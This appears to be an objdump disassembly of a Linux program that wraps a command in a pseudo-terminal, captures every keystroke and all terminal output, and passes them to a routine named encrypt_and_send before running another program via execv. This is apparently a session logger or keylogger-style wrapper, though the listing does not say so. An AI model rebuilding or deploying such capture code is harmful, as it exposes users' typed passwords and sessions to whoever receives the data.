  402423:	e8 48 ea ff ff       	callq  400e70 <printf@plt>
  402428:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40242d:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402432:	b8 00 00 00 00       	mov    $0x0,%eax
  402437:	e8 34 ea ff ff       	callq  400e70 <printf@plt>
  40243c:	e8 9f e9 ff ff       	callq  400de0 <__errno_location@plt>
  402441:	8b 00                	mov    (%rax),%eax
  402443:	89 c6                	mov    %eax,%esi
  402445:	bf d9 7a 40 00       	mov    $0x407ad9,%edi
  40244a:	b8 00 00 00 00       	mov    $0x0,%eax
  40244f:	e8 1c ea ff ff       	callq  400e70 <printf@plt>
  402454:	e9 c9 06 00 00       	jmpq   402b22 <main+0x9f5>
  402459:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402460:	48 89 c7             	mov    %rax,%rdi
  402463:	e8 1d 08 00 00       	callq  402c85 <pretty_time>
  402468:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40246f:	48 89 c2             	mov    %rax,%rdx
  402472:	be 59 7a 40 00       	mov    $0x407a59,%esi
  402477:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40247c:	b8 00 00 00 00       	mov    $0x0,%eax
  402481:	e8 ea e9 ff ff       	callq  400e70 <printf@plt>
  402486:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40248b:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402490:	b8 00 00 00 00       	mov    $0x0,%eax
  402495:	e8 d6 e9 ff ff       	callq  400e70 <printf@plt>
  40249a:	48 8b 85 d8 ed ff ff 	mov    -0x1228(%rbp),%rax
  4024a1:	48 89 c6             	mov    %rax,%rsi
  4024a4:	bf f2 7a 40 00       	mov    $0x407af2,%edi
  4024a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4024ae:	e8 bd e9 ff ff       	callq  400e70 <printf@plt>
  4024b3:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4024b9:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  4024c0:	48 89 d6             	mov    %rdx,%rsi
  4024c3:	89 c7                	mov    %eax,%edi
  4024c5:	e8 cf ec ff ff       	callq  401199 <setup_terminal>
  4024ca:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  4024d0:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  4024d7:	74 50                	je     402529 <main+0x3fc>
  4024d9:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4024e0:	48 89 c7             	mov    %rax,%rdi
  4024e3:	e8 9d 07 00 00       	callq  402c85 <pretty_time>
  4024e8:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4024ef:	48 89 c2             	mov    %rax,%rdx
  4024f2:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4024f7:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4024fc:	b8 00 00 00 00       	mov    $0x0,%eax
  402501:	e8 6a e9 ff ff       	callq  400e70 <printf@plt>
  402506:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40250b:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402510:	b8 00 00 00 00       	mov    $0x0,%eax
  402515:	e8 56 e9 ff ff       	callq  400e70 <printf@plt>
  40251a:	bf 03 7b 40 00       	mov    $0x407b03,%edi
  40251f:	e8 cc e8 ff ff       	callq  400df0 <puts@plt>
  402524:	e9 f9 05 00 00       	jmpq   402b22 <main+0x9f5>
  402529:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402530:	48 83 c0 10          	add    $0x10,%rax
  402534:	48 89 c2             	mov    %rax,%rdx
  402537:	be 13 54 00 00       	mov    $0x5413,%esi
  40253c:	bf 00 00 00 00       	mov    $0x0,%edi
  402541:	b8 00 00 00 00       	mov    $0x0,%eax
  402546:	e8 75 e9 ff ff       	callq  400ec0 <ioctl@plt>
  40254b:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402551:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402558:	48 83 c2 10          	add    $0x10,%rdx
  40255c:	be 14 54 00 00       	mov    $0x5414,%esi
  402561:	89 c7                	mov    %eax,%edi
  402563:	b8 00 00 00 00       	mov    $0x0,%eax
  402568:	e8 53 e9 ff ff       	callq  400ec0 <ioctl@plt>
  40256d:	be 5d 11 40 00       	mov    $0x40115d,%esi
  402572:	bf 1c 00 00 00       	mov    $0x1c,%edi
  402577:	e8 c4 e9 ff ff       	callq  400f40 <signal@plt>
  40257c:	be 5d 11 40 00       	mov    $0x40115d,%esi
  402581:	bf 11 00 00 00       	mov    $0x11,%edi
  402586:	e8 b5 e9 ff ff       	callq  400f40 <signal@plt>
  40258b:	e8 a0 ea ff ff       	callq  401030 <fork@plt>
  402590:	89 85 e8 ef ff ff    	mov    %eax,-0x1018(%rbp)
  402596:	8b 85 e8 ef ff ff    	mov    -0x1018(%rbp),%eax
  40259c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40259f:	74 09                	je     4025aa <main+0x47d>
  4025a1:	85 c0                	test   %eax,%eax
  4025a3:	74 72                	je     402617 <main+0x4ea>
  4025a5:	e9 f1 01 00 00       	jmpq   40279b <main+0x66e>
  4025aa:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4025b1:	48 89 c7             	mov    %rax,%rdi
  4025b4:	e8 17 ed ff ff       	callq  4012d0 <reset_terminal>
  4025b9:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4025c0:	48 89 c7             	mov    %rax,%rdi
  4025c3:	e8 bd 06 00 00       	callq  402c85 <pretty_time>
  4025c8:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4025cf:	48 89 c2             	mov    %rax,%rdx
  4025d2:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4025d7:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4025dc:	b8 00 00 00 00       	mov    $0x0,%eax
  4025e1:	e8 8a e8 ff ff       	callq  400e70 <printf@plt>
  4025e6:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4025eb:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4025f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4025f5:	e8 76 e8 ff ff       	callq  400e70 <printf@plt>
  4025fa:	e8 e1 e7 ff ff       	callq  400de0 <__errno_location@plt>
  4025ff:	8b 00                	mov    (%rax),%eax
  402601:	89 c6                	mov    %eax,%esi
  402603:	bf 19 7b 40 00       	mov    $0x407b19,%edi
  402608:	b8 00 00 00 00       	mov    $0x0,%eax
  40260d:	e8 5e e8 ff ff       	callq  400e70 <printf@plt>
  402612:	e9 0b 05 00 00       	jmpq   402b22 <main+0x9f5>
  402617:	e8 d4 e8 ff ff       	callq  400ef0 <setsid@plt>
  40261c:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  402622:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  402629:	74 59                	je     402684 <main+0x557>
  40262b:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  402632:	48 89 c7             	mov    %rax,%rdi
  402635:	e8 4b 06 00 00       	callq  402c85 <pretty_time>
  40263a:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  402641:	48 89 c2             	mov    %rax,%rdx
  402644:	be c1 78 40 00       	mov    $0x4078c1,%esi
  402649:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40264e:	b8 00 00 00 00       	mov    $0x0,%eax
  402653:	e8 18 e8 ff ff       	callq  400e70 <printf@plt>
  402658:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40265d:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402662:	b8 00 00 00 00       	mov    $0x0,%eax
  402667:	e8 04 e8 ff ff       	callq  400e70 <printf@plt>
  40266c:	e8 6f e7 ff ff       	callq  400de0 <__errno_location@plt>
  402671:	8b 00                	mov    (%rax),%eax
  402673:	89 c6                	mov    %eax,%esi
  402675:	bf 30 7b 40 00       	mov    $0x407b30,%edi
  40267a:	b8 00 00 00 00       	mov    $0x0,%eax
  40267f:	e8 ec e7 ff ff       	callq  400e70 <printf@plt>
  402684:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  40268a:	ba 00 00 00 00       	mov    $0x0,%edx
  40268f:	be 0e 54 00 00       	mov    $0x540e,%esi
  402694:	89 c7                	mov    %eax,%edi
  402696:	b8 00 00 00 00       	mov    $0x0,%eax
  40269b:	e8 20 e8 ff ff       	callq  400ec0 <ioctl@plt>
  4026a0:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026a6:	85 c0                	test   %eax,%eax
  4026a8:	74 1c                	je     4026c6 <main+0x599>
  4026aa:	bf 00 00 00 00       	mov    $0x0,%edi
  4026af:	e8 2c e8 ff ff       	callq  400ee0 <close@plt>
  4026b4:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026ba:	be 00 00 00 00       	mov    $0x0,%esi
  4026bf:	89 c7                	mov    %eax,%edi
  4026c1:	e8 9a e7 ff ff       	callq  400e60 <dup2@plt>
  4026c6:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026cc:	83 f8 01             	cmp    $0x1,%eax
  4026cf:	74 1c                	je     4026ed <main+0x5c0>
  4026d1:	bf 01 00 00 00       	mov    $0x1,%edi
  4026d6:	e8 05 e8 ff ff       	callq  400ee0 <close@plt>
  4026db:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026e1:	be 01 00 00 00       	mov    $0x1,%esi
  4026e6:	89 c7                	mov    %eax,%edi
  4026e8:	e8 73 e7 ff ff       	callq  400e60 <dup2@plt>
  4026ed:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026f3:	83 f8 02             	cmp    $0x2,%eax
  4026f6:	74 1c                	je     402714 <main+0x5e7>
  4026f8:	bf 02 00 00 00       	mov    $0x2,%edi
  4026fd:	e8 de e7 ff ff       	callq  400ee0 <close@plt>
  402702:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402708:	be 02 00 00 00       	mov    $0x2,%esi
  40270d:	89 c7                	mov    %eax,%edi
  40270f:	e8 4c e7 ff ff       	callq  400e60 <dup2@plt>
  402714:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  40271a:	83 f8 02             	cmp    $0x2,%eax
  40271d:	7e 0d                	jle    40272c <main+0x5ff>
  40271f:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402725:	89 c7                	mov    %eax,%edi
  402727:	e8 b4 e7 ff ff       	callq  400ee0 <close@plt>
  40272c:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402732:	83 f8 02             	cmp    $0x2,%eax
  402735:	7e 0d                	jle    402744 <main+0x617>
  402737:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  40273d:	89 c7                	mov    %eax,%edi
  40273f:	e8 9c e7 ff ff       	callq  400ee0 <close@plt>
  402744:	8b 85 70 ee ff ff    	mov    -0x1190(%rbp),%eax
  40274a:	89 c7                	mov    %eax,%edi
  40274c:	e8 8f e7 ff ff       	callq  400ee0 <close@plt>
  402751:	bf 50 c3 00 00       	mov    $0xc350,%edi
  402756:	e8 f5 e8 ff ff       	callq  401050 <usleep@plt>
  40275b:	48 8b 95 a0 ed ff ff 	mov    -0x1260(%rbp),%rdx
  402762:	48 8d 85 90 ee ff ff 	lea    -0x1170(%rbp),%rax
  402769:	48 89 d6             	mov    %rdx,%rsi
  40276c:	48 89 c7             	mov    %rax,%rdi
  40276f:	e8 ac e8 ff ff       	callq  401020 <execv@plt>
  402774:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40277b:	48 83 c0 18          	add    $0x18,%rax
  40277f:	48 89 c2             	mov    %rax,%rdx
  402782:	be 00 00 00 00       	mov    $0x0,%esi
  402787:	bf 00 00 00 00       	mov    $0x0,%edi
  40278c:	e8 6f e8 ff ff       	callq  401000 <tcsetattr@plt>
  402791:	bf 01 00 00 00       	mov    $0x1,%edi
  402796:	e8 75 e8 ff ff       	callq  401010 <exit@plt>
  40279b:	bf 00 00 00 00       	mov    $0x0,%edi
  4027a0:	e8 eb e7 ff ff       	callq  400f90 <time@plt>
  4027a5:	89 c7                	mov    %eax,%edi
  4027a7:	e8 74 e7 ff ff       	callq  400f20 <srand@plt>
  4027ac:	e8 8f e6 ff ff       	callq  400e40 <getuid@plt>
  4027b1:	89 85 e4 ef ff ff    	mov    %eax,-0x101c(%rbp)
  4027b7:	b8 00 00 00 00       	mov    $0x0,%eax
  4027bc:	ba 10 00 00 00       	mov    $0x10,%edx
  4027c1:	48 8d b5 e0 ed ff ff 	lea    -0x1220(%rbp),%rsi
  4027c8:	48 89 d1             	mov    %rdx,%rcx
  4027cb:	48 89 f7             	mov    %rsi,%rdi
  4027ce:	fc                   	cld    
  4027cf:	f3 48 ab             	rep stos %rax,%es:(%rdi)
  4027d2:	89 f8                	mov    %edi,%eax
  4027d4:	89 ca                	mov    %ecx,%edx
  4027d6:	89 95 cc ed ff ff    	mov    %edx,-0x1234(%rbp)
  4027dc:	89 85 d0 ed ff ff    	mov    %eax,-0x1230(%rbp)
  4027e2:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  4027e8:	8d 50 3f             	lea    0x3f(%rax),%edx
  4027eb:	85 c0                	test   %eax,%eax
  4027ed:	0f 48 c2             	cmovs  %edx,%eax
  4027f0:	c1 f8 06             	sar    $0x6,%eax
  4027f3:	48 63 d0             	movslq %eax,%rdx
  4027f6:	48 8b b4 d5 e0 ed ff 	mov    -0x1220(%rbp,%rdx,8),%rsi
  4027fd:	ff 
  4027fe:	8b 95 bc ed ff ff    	mov    -0x1244(%rbp),%edx
  402804:	89 d1                	mov    %edx,%ecx
  402806:	c1 f9 1f             	sar    $0x1f,%ecx
  402809:	c1 e9 1a             	shr    $0x1a,%ecx
  40280c:	01 ca                	add    %ecx,%edx
  40280e:	83 e2 3f             	and    $0x3f,%edx
  402811:	29 ca                	sub    %ecx,%edx
  402813:	bf 01 00 00 00       	mov    $0x1,%edi
  402818:	89 d1                	mov    %edx,%ecx
  40281a:	48 d3 e7             	shl    %cl,%rdi
  40281d:	48 89 fa             	mov    %rdi,%rdx
  402820:	48 09 f2             	or     %rsi,%rdx
  402823:	48 98                	cltq   
  402825:	48 89 94 c5 e0 ed ff 	mov    %rdx,-0x1220(%rbp,%rax,8)
  40282c:	ff 
  40282d:	48 8b 85 e0 ed ff ff 	mov    -0x1220(%rbp),%rax
  402834:	48 83 c8 01          	or     $0x1,%rax
  402838:	48 89 85 e0 ed ff ff 	mov    %rax,-0x1220(%rbp)
  40283f:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402845:	ba 00 00 00 00       	mov    $0x0,%edx
  40284a:	85 c0                	test   %eax,%eax
  40284c:	0f 48 c2             	cmovs  %edx,%eax
  40284f:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402855:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  40285b:	8d 78 01             	lea    0x1(%rax),%edi
  40285e:	48 8d 85 e0 ed ff ff 	lea    -0x1220(%rbp),%rax
  402865:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  40286b:	b9 00 00 00 00       	mov    $0x0,%ecx
  402870:	ba 00 00 00 00       	mov    $0x0,%edx
  402875:	48 89 c6             	mov    %rax,%rsi
  402878:	e8 23 e7 ff ff       	callq  400fa0 <select@plt>
  40287d:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402883:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  40288a:	79 2e                	jns    4028ba <main+0x78d>
  40288c:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402893:	79 20                	jns    4028b5 <main+0x788>
  402895:	e8 46 e5 ff ff       	callq  400de0 <__errno_location@plt>
  40289a:	8b 00                	mov    (%rax),%eax
  40289c:	83 f8 04             	cmp    $0x4,%eax
  40289f:	0f 84 f0 01 00 00    	je     402a95 <main+0x968>
  4028a5:	e8 36 e5 ff ff       	callq  400de0 <__errno_location@plt>
  4028aa:	8b 00                	mov    (%rax),%eax
  4028ac:	83 f8 0b             	cmp    $0xb,%eax
  4028af:	0f 84 e0 01 00 00    	je     402a95 <main+0x968>
  4028b5:	e9 67 02 00 00       	jmpq   402b21 <main+0x9f4>
  4028ba:	48 8b 85 e0 ed ff ff 	mov    -0x1220(%rbp),%rax
  4028c1:	83 e0 01             	and    $0x1,%eax
  4028c4:	48 85 c0             	test   %rax,%rax
  4028c7:	0f 84 c7 00 00 00    	je     402994 <main+0x867>
  4028cd:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4028d4:	be 00 00 00 00       	mov    $0x0,%esi
  4028d9:	48 89 c7             	mov    %rax,%rdi
  4028dc:	e8 cf e5 ff ff       	callq  400eb0 <gettimeofday@plt>
  4028e1:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4028e8:	48 83 c0 64          	add    $0x64,%rax
  4028ec:	ba 00 10 00 00       	mov    $0x1000,%edx
  4028f1:	48 89 c6             	mov    %rax,%rsi
  4028f4:	bf 00 00 00 00       	mov    $0x0,%edi
  4028f9:	e8 02 e6 ff ff       	callq  400f00 <read@plt>
  4028fe:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402904:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  40290b:	7f 2e                	jg     40293b <main+0x80e>
  40290d:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402914:	79 20                	jns    402936 <main+0x809>
  402916:	e8 c5 e4 ff ff       	callq  400de0 <__errno_location@plt>
  40291b:	8b 00                	mov    (%rax),%eax
  40291d:	83 f8 04             	cmp    $0x4,%eax
  402920:	0f 84 6f 01 00 00    	je     402a95 <main+0x968>
  402926:	e8 b5 e4 ff ff       	callq  400de0 <__errno_location@plt>
  40292b:	8b 00                	mov    (%rax),%eax
  40292d:	83 f8 0b             	cmp    $0xb,%eax
  402930:	0f 84 5f 01 00 00    	je     402a95 <main+0x968>
  402936:	e9 e6 01 00 00       	jmpq   402b21 <main+0x9f4>
  40293b:	c7 85 ec ef ff ff 00 	movl   $0x0,-0x1014(%rbp)
  402942:	00 00 00 
  402945:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  40294b:	89 85 f0 ef ff ff    	mov    %eax,-0x1010(%rbp)
  402951:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402958:	48 8d 85 70 ee ff ff 	lea    -0x1190(%rbp),%rax
  40295f:	48 89 d6             	mov    %rdx,%rsi
  402962:	48 89 c7             	mov    %rax,%rdi
  402965:	e8 32 ec ff ff       	callq  40159c <encrypt_and_send>
  40296a:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  402970:	48 63 d0             	movslq %eax,%rdx
  402973:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402979:	48 8d 8d 90 ef ff ff 	lea    -0x1070(%rbp),%rcx
  402980:	48 83 c1 64          	add    $0x64,%rcx
  402984:	48 89 ce             	mov    %rcx,%rsi
  402987:	89 c7                	mov    %eax,%edi
  402989:	e8 82 e4 ff ff       	callq  400e10 <write@plt>
  40298e:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402994:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  40299a:	8d 50 3f             	lea    0x3f(%rax),%edx
  40299d:	85 c0                	test   %eax,%eax
  40299f:	0f 48 c2             	cmovs  %edx,%eax
  4029a2:	c1 f8 06             	sar    $0x6,%eax
  4029a5:	48 98                	cltq   
  4029a7:	48 8b b4 c5 e0 ed ff 	mov    -0x1220(%rbp,%rax,8),%rsi
  4029ae:	ff 
  4029af:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  4029b5:	99                   	cltd   
  4029b6:	c1 ea 1a             	shr    $0x1a,%edx
  4029b9:	01 d0                	add    %edx,%eax
  4029bb:	83 e0 3f             	and    $0x3f,%eax
  4029be:	29 d0                	sub    %edx,%eax
  4029c0:	89 c1                	mov    %eax,%ecx
  4029c2:	48 d3 fe             	sar    %cl,%rsi
  4029c5:	48 89 f0             	mov    %rsi,%rax
  4029c8:	83 e0 01             	and    $0x1,%eax
  4029cb:	48 85 c0             	test   %rax,%rax
  4029ce:	0f 84 c1 00 00 00    	je     402a95 <main+0x968>
  4029d4:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4029db:	be 00 00 00 00       	mov    $0x0,%esi
  4029e0:	48 89 c7             	mov    %rax,%rdi
  4029e3:	e8 c8 e4 ff ff       	callq  400eb0 <gettimeofday@plt>
  4029e8:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  4029ee:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  4029f5:	48 8d 4a 64          	lea    0x64(%rdx),%rcx
  4029f9:	ba 00 10 00 00       	mov    $0x1000,%edx
  4029fe:	48 89 ce             	mov    %rcx,%rsi
  402a01:	89 c7                	mov    %eax,%edi
  402a03:	e8 f8 e4 ff ff       	callq  400f00 <read@plt>
  402a08:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402a0e:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402a15:	7f 26                	jg     402a3d <main+0x910>
  402a17:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402a1e:	79 18                	jns    402a38 <main+0x90b>
  402a20:	e8 bb e3 ff ff       	callq  400de0 <__errno_location@plt>
  402a25:	8b 00                	mov    (%rax),%eax
  402a27:	83 f8 04             	cmp    $0x4,%eax
  402a2a:	74 69                	je     402a95 <main+0x968>
  402a2c:	e8 af e3 ff ff       	callq  400de0 <__errno_location@plt>
  402a31:	8b 00                	mov    (%rax),%eax
  402a33:	83 f8 0b             	cmp    $0xb,%eax
  402a36:	74 5d                	je     402a95 <main+0x968>
  402a38:	e9 e4 00 00 00       	jmpq   402b21 <main+0x9f4>
  402a3d:	c7 85 ec ef ff ff 01 	movl   $0x1,-0x1014(%rbp)
  402a44:	00 00 00 
  402a47:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  402a4d:	89 85 f0 ef ff ff    	mov    %eax,-0x1010(%rbp)
  402a53:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402a5a:	48 8d 85 70 ee ff ff 	lea    -0x1190(%rbp),%rax
  402a61:	48 89 d6             	mov    %rdx,%rsi
  402a64:	48 89 c7             	mov    %rax,%rdi
  402a67:	e8 30 eb ff ff       	callq  40159c <encrypt_and_send>
  402a6c:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  402a72:	48 98                	cltq   
  402a74:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402a7b:	48 8d 4a 64          	lea    0x64(%rdx),%rcx
  402a7f:	48 89 c2             	mov    %rax,%rdx
  402a82:	48 89 ce             	mov    %rcx,%rsi
  402a85:	bf 01 00 00 00       	mov    $0x1,%edi
  402a8a:	e8 81 e3 ff ff       	callq  400e10 <write@plt>
  402a8f:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402a95:	8b 05 4d 67 20 00    	mov    0x20674d(%rip),%eax        # 6091e8 <got_sigchld>
  402a9b:	83 f8 01             	cmp    $0x1,%eax
  402a9e:	75 0c                	jne    402aac <main+0x97f>
  402aa0:	c7 05 3e 67 20 00 00 	movl   $0x0,0x20673e(%rip)        # 6091e8 <got_sigchld>
  402aa7:	00 00 00 
  402aaa:	eb 75                	jmp    402b21 <main+0x9f4>
  402aac:	8b 05 32 67 20 00    	mov    0x206732(%rip),%eax        # 6091e4 <got_sigwinch>
  402ab2:	83 f8 01             	cmp    $0x1,%eax
  402ab5:	75 65                	jne    402b1c <main+0x9ef>
  402ab7:	c7 05 23 67 20 00 00 	movl   $0x0,0x206723(%rip)        # 6091e4 <got_sigwinch>
  402abe:	00 00 00 
  402ac1:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402ac8:	48 83 c0 10          	add    $0x10,%rax
  402acc:	48 89 c2             	mov    %rax,%rdx
  402acf:	be 13 54 00 00       	mov    $0x5413,%esi
  402ad4:	bf 00 00 00 00       	mov    $0x0,%edi
  402ad9:	b8 00 00 00 00       	mov    $0x0,%eax
  402ade:	e8 dd e3 ff ff       	callq  400ec0 <ioctl@plt>
  402ae3:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402ae9:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402af0:	48 83 c2 10          	add    $0x10,%rdx
  402af4:	be 14 54 00 00       	mov    $0x5414,%esi
  402af9:	89 c7                	mov    %eax,%edi
  402afb:	b8 00 00 00 00       	mov    $0x0,%eax
  402b00:	e8 bb e3 ff ff       	callq  400ec0 <ioctl@plt>
  402b05:	8b 85 e8 ef ff ff    	mov    -0x1018(%rbp),%eax
  402b0b:	be 1c 00 00 00       	mov    $0x1c,%esi
  402b10:	89 c7                	mov    %eax,%edi
  402b12:	e8 59 e4 ff ff       	callq  400f70 <kill@plt>
  402b17:	e9 9b fc ff ff       	jmpq   4027b7 <main+0x68a>
  402b1c:	e9 96 fc ff ff       	jmpq   4027b7 <main+0x68a>
  402b21:	90                   	nop
  402b22:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402b28:	85 c0                	test   %eax,%eax
  402b2a:	78 0d                	js     402b39 <main+0xa0c>
  402b2c:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402b32:	89 c7                	mov    %eax,%edi
  402b34:	e8 a7 e3 ff ff       	callq  400ee0 <close@plt>
  402b39:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402b3f:	85 c0                	test   %eax,%eax
  402b41:	78 0d                	js     402b50 <main+0xa23>
  402b43:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402b49:	89 c7                	mov    %eax,%edi
  402b4b:	e8 90 e3 ff ff       	callq  400ee0 <close@plt>
  402b50:	8b 85 70 ee ff ff    	mov    -0x1190(%rbp),%eax
  402b56:	85 c0                	test   %eax,%eax
  402b58:	78 0d                	js     402b67 <main+0xa3a>
  402b5a:	8b 85 70 ee ff ff    	mov    -0x1190(%rbp),%eax
  402b60:	89 c7                	mov    %eax,%edi
  402b62:	e8 79 e3 ff ff       	callq  400ee0 <close@plt>
  402b67:	48 8b 95 a0 ed ff ff 	mov    -0x1260(%rbp),%rdx
  402b6e:	48 8d 85 90 ee ff ff 	lea    -0x1170(%rbp),%rax
  402b75:	48 89 d6             	mov    %rdx,%rsi
  402b78:	48 89 c7             	mov    %rax,%rdi
  402b7b:	e8 a0 e4 ff ff       	callq  401020 <execv@plt>
  402b80:	bf 01 00 00 00       	mov    $0x1,%edi
  402b85:	e8 86 e4 ff ff       	callq  401010 <exit@plt>

0000000000402b8a <__print_output>:
  402b8a:	55                   	push   %rbp
  402b8b:	48 89 e5             	mov    %rsp,%rbp
  402b8e:	48 83 ec 30          	sub    $0x30,%rsp
  402b92:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  402b96:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  402b9a:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  402b9e:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402ba2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402ba6:	48 01 d0             	add    %rdx,%rax
  402ba9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  402bad:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  402bb4:	e9 b3 00 00 00       	jmpq   402c6c <__print_output+0xe2>
  402bb9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402bbd:	0f b6 00             	movzbl (%rax),%eax
  402bc0:	3c 0d                	cmp    $0xd,%al
  402bc2:	75 19                	jne    402bdd <__print_output+0x53>
  402bc4:	bf 5c 00 00 00       	mov    $0x5c,%edi
  402bc9:	e8 02 e2 ff ff       	callq  400dd0 <putchar@plt>
  402bce:	bf 72 00 00 00       	mov    $0x72,%edi
  402bd3:	e8 f8 e1 ff ff       	callq  400dd0 <putchar@plt>
  402bd8:	e9 86 00 00 00       	jmpq   402c63 <__print_output+0xd9>
  402bdd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402be1:	0f b6 00             	movzbl (%rax),%eax
  402be4:	3c 0a                	cmp    $0xa,%al
  402be6:	75 16                	jne    402bfe <__print_output+0x74>
  402be8:	bf 5c 00 00 00       	mov    $0x5c,%edi
  402bed:	e8 de e1 ff ff       	callq  400dd0 <putchar@plt>
  402bf2:	bf 6e 00 00 00       	mov    $0x6e,%edi
  402bf7:	e8 d4 e1 ff ff       	callq  400dd0 <putchar@plt>
  402bfc:	eb 65                	jmp    402c63 <__print_output+0xd9>
  402bfe:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c02:	0f b6 00             	movzbl (%rax),%eax
  402c05:	3c 09                	cmp    $0x9,%al
  402c07:	75 16                	jne    402c1f <__print_output+0x95>
  402c09:	bf 5c 00 00 00       	mov    $0x5c,%edi
  402c0e:	e8 bd e1 ff ff       	callq  400dd0 <putchar@plt>
